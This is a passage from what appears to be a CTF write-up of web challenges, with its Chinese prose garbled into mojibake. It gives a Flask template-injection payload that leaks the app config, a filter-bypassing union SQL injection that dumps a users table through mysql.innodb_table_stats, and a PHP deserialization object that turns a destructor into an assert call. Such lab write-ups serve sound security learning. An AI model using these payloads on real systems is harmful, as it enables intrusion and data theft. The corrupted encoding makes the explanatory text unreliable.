ä¸è¿‡ python è¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°ï¼Œæ¯”å¦‚ ``url_for``å’Œ``get_flashed_messages``ï¼Œå¯ä»¥è¯»å–åˆ°å†…å®¹ã€‚

+ **url_for**ï¼šurl_for ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œåº”è¯¥æ˜¯è§†å›¾å‡½æ•°çš„åå­—çš„å­—ç¬¦ä¸²ã€‚åé¢çš„å‚æ•°å°±æ˜¯ä¼ é€’ç»™``url``çš„ã€‚å¦‚æœä¼ é€’çš„å‚æ•°ä¹‹å‰åœ¨``url``ä¸­å·²ç»å®šä¹‰äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°å°±ä¼šè¢«å½“æˆ``path``çš„å½¢å¼ç»™``url``ã€‚å¦‚æœè¿™ä¸ªå‚æ•°ä¹‹å‰æ²¡æœ‰åœ¨``url``ä¸­å®šä¹‰ï¼Œé‚£ä¹ˆå°†ä¼šå˜æˆæŸ¥è¯¢å­—ç¬¦ä¸²çš„å½¢å¼æ”¾åˆ°``url``ä¸­ã€‚

+ **get_flashed_messagesï¼š** è¿”å›ä¹‹å‰åœ¨Flaskä¸­é€šè¿‡ flash() ä¼ å…¥çš„é—ªç°ä¿¡æ¯åˆ—è¡¨ã€‚æŠŠå­—ç¬¦ä¸²å¯¹è±¡è¡¨ç¤ºçš„æ¶ˆæ¯åŠ å…¥åˆ°ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸­ï¼Œç„¶åé€šè¿‡è°ƒç”¨ get_flashed_messages() æ–¹æ³•å–å‡º(é—ªç°ä¿¡æ¯åªèƒ½å–å‡ºä¸€æ¬¡ï¼Œå–å‡ºåé—ªç°ä¿¡æ¯ä¼šè¢«æ¸…ç©º)ã€‚

è¯»å–å…¨å±€å˜é‡ï¼š``/shrine/{{url_for.__globals__}}``ã€‚

[![WmVmRS.png](https://z3.ax1x.com/2021/07/15/WmVmRS.png)](https://imgtu.com/i/WmVmRS)

``current_app``è¡¨ç¤ºå½“å‰appï¼Œæ‰€ä»¥æˆ‘ä»¬å»æ‰¾è¿™ä¸ªå½“å‰appä¸‹çš„configï¼š``/shrine/{{url_for.__globals__['current_app'].config}}``

å¾—åˆ°flagã€‚

æˆ–ä½¿ç”¨``get_flashed_messages``ä¹Ÿå¯ä»¥ã€‚payloadï¼š``/shrine/{{get_flashed_messages.__globals__['current_app'].config}}``ã€‚

### [SWPU2019]Web1

**æ— åæ³¨å…¥**

æ­£å¸¸ç™»å½•æ³¨å†Œæ¡†ï¼Œå…ˆæ³¨å†Œadminå‘ç°å·²ç»è¢«æ³¨å†Œï¼Œç®€å•çš„ç»•è¿‡æ— æ•ˆã€‚å…ˆæ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç™»å½•è¿›å»åæœ‰ä¸ªå‘å¸ƒå¹¿å‘Šï¼Œå‘å¸ƒä¸ªå¹¿å‘Šå``1'``ï¼Œå†…å®¹éšä¾¿ã€‚å»æŸ¥çœ‹ï¼š

[![Wm1AXV.png](https://z3.ax1x.com/2021/07/15/Wm1AXV.png)](https://imgtu.com/i/Wm1AXV)

å‘ç°å­˜åœ¨æ³¨å…¥æ¼æ´ã€‚

å…ˆfuzzä¸€ä¸‹ï¼Œå‘ç° ``and, or, information_schema, order, updatexml``ç­‰å·²è¢«è¿‡æ»¤ï¼Œä¸”å¤§å°å†™æ— æ³•ç»•è¿‡ã€‚ (å…ˆå¼€å§‹æ³¨å­—æ®µï¼Œå› ä¸ºæ³¨é‡Šä¹Ÿè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æœ€åæˆ‘ä»¬è¦é—­åˆ)

```mysql
1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,18,20,21,22/**/'
```

å¾—åˆ°æœ‰22åˆ—ã€‚å›æ˜¾åœ¨2ï¼Œ3å¤„ã€‚

å› ä¸º information_schemaä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åˆ©ç”¨å…¶ä»–æ–¹æ³•bypassã€‚

+ sys.schema_auto_increment_columnsåº“æŸ¥è¯¢ ä½†è¿™ä¸ªä¸€èˆ¬è¦æˆç»©ç®¡ç†å‘˜æ‰å¯ä»¥è®¿é—®sysã€‚

+ innodb

  [![WnaTm9.png](https://z3.ax1x.com/2021/07/15/WnaTm9.png)](https://imgtu.com/i/WnaTm9)

æ³¨è¡¨åï¼š

```mysql
-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

çŒœè¡¨çš„åˆ—æ•°ï¼š(è¿™é‡Œå°±è¦ç”¨åˆ°æ— åæ³¨å…¥äº†) å¾—åˆ°usersæœ‰3åˆ—

```mysql
-1'union/**/select/**/1,(select/**/group_concat(`1`)/**/from(select/**/1,2/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
-1'union/**/select/**/1,(select/**/group_concat(`1`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

æ³¨å€¼ï¼š

```mysql
-1'union/**/select/**/1,(select/**/group_concat(`2`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
-1'union/**/select/**/1,(select/**/group_concat(`3`)/**/from(select/**/1,2,3/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'
```

### [NPUCTF2020]ReadlezPHP

+ phpååºåˆ—åŒ–
+ phpå˜é‡åŠ¨æ€å‡½æ•°

**çŸ¥è¯†ç‚¹ï¼š** 

assert()å‡½æ•°ï¼š

[![WQyFIS.png](https://z3.ax1x.com/2021/07/17/WQyFIS.png)](https://imgtu.com/i/WQyFIS)

**è§£é¢˜ï¼š**

æŸ¥çœ‹æºç åï¼Œå¾—åˆ°æç¤ºï¼š

[![WQySKI.png](https://z3.ax1x.com/2021/07/17/WQySKI.png)](https://imgtu.com/i/WQySKI)

å»è®¿é—®ï¼Œå¾—åˆ°ä»£ç ï¼š

```php
<?php
#error_reporting(0);
class HelloPhp
{
    public $a;
    public $b;
    public function __construct(){
        $this->a = "Y-m-d h:i:s";
        $this->b = "date";
    }
    public function __destruct(){
        $a = $this->a;
        $b = $this->b;
        echo $b($a);
    }
}
$c = new HelloPhp;

if(isset($_GET['source']))
{
    highlight_file(__FILE__);
    die(0);
}

@$ppp = unserialize($_GET["data"]);
```

å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ååºåˆ—åŒ–åä¼šæ‰§è¡Œ``echo $b($a);``ï¼Œè¿™é‡Œä¸º

```php
<?php
class HelloPhp {
    public $a;
    public $b;
    
    public function __construct() {
        $this->a = "phpinfo()";
        $this->b = "assert";
    }
}  

$c = new HelloPhp;
$d = serialize($c);
echo $d;
?>
```

...